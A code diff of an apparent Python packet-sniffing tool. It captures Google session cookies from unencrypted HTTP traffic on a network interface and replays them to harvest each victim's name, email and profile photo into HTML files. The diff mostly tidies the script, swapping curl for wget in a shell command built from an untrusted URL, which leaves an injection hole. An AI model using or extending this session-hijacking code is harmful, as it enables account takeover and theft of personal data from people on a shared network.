@@ -16,7 +16,6 @@ session_ids =set() # a global set for all session ids
 user_packet ={}
 user_complete = {}
 user_start = {}
-counter = 0
 
 def subprocess_cmd(command):
     process = subprocess.Popen(command,stdout=subprocess.PIPE, shell=True)
@@ -34,11 +33,9 @@ def extract_google_stok(cookie):
 	else:
 		return session_tok
 
+
 def make_request(cookie, user_ip):
-
-
 	#if ipv6 request
-
 	if user_ip.count(":") >1:
 
 		col_ind = user_ip.rfind(":")
@@ -47,10 +44,6 @@ def make_request(cookie, user_ip):
 	else:
 		temp_ip = user_ip.split(":")[0].replace(".","")
 
-
-	print temp_ip
-
-	
 	url = 'http://www.google.com/?gws_rd=ssl'
 	add_headers = {"Connection": "keep-alive", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.86 Safari/537.36", "Accept-Language": "en-US,en;q=0.8"}
 	add_headers["Cookie"] = cookie
@@ -65,25 +58,23 @@ def make_request(cookie, user_ip):
 
 	img_file = temp_ip+".jpg"
 
-
 	f = open("./client_files/"+temp_ip+".html", "w")
 	f.write(name+"<br><br><br>")
 	f.write(email+"<br><br><br>")
 	f.write("<img src=\""+img_file+"\" alt=\"Smiley face\" height=\"300\" width=\"300\">")
-	subprocess_cmd("curl "+usr_img+" > ./client_files/"+img_file)
+	subprocess_cmd("wget -O ./client_files/"+img_file+" "+usr_img)
 	f.close()
 	# subprocess_cmd("echo "+name+" > ./"+user_ip.split(":")[0]+"/name.txt")
 	# subprocess_cmd("echo "+email+" > ./"+user_ip.split(":")[0]+"/email.txt")
 
 def extract_cookie(packet):
 
-	counter = counter+1
 	# provide access to globar variables
-	global counter
 	global session_ids
 	global user_packet
 	global user_complete
 	global user_start
+
 
 	s_tok = None
 	cur_packet = None
@@ -105,11 +96,7 @@ def extract_cookie(packet):
 
 		p_src=packet.sprintf("{TCP:%TCP.sport%}")
 
-		user_key = ip_src+":"+p_src
-
-		print user_key
-
-
+		user_key = ip_src+":"+p_src		
 		#create an entry for a user tuple
 		if 'GET /' in x and "host: www.google.com" in x.lower() and user_key not in user_packet:
 			user_packet[user_key] =	 None
@@ -163,10 +150,9 @@ def extract_cookie(packet):
 
 
 def main():
-
 	subprocess_cmd("mkdir -m 777 client_files") #create dir for storing files
 	interface = sys.argv[1]
-	print interface
+	print "now listening on: "+interface
 	sniff(iface=interface, prn=extract_cookie)
 if __name__ == '__main__':
 	main()
